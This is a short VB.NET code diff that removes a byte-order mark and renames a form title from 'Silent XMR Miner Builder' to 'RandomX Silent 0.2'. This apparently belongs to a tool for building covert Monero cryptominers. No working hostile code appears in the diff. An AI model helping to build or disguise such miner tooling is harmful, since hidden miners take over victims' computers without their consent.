@@ -1,4 +1,4 @@
-﻿Public Class Form1
+Public Class Form1
     Public Shared rand As New Random()
 
     Private Sub Form1_Load(sender As Object, e As EventArgs) Handles Me.Load
@@ -10,7 +10,7 @@
 
     Private Sub BackgroundWorker1_DoWork(sender As Object, e As System.ComponentModel.DoWorkEventArgs) Handles BackgroundWorker1.DoWork
         Try
-            MephForm1.Text = "Silent XMR Miner Builder"
+            MephForm1.Text = "RandomX Silent 0.2"
         Catch ex As Exception
         End Try
 
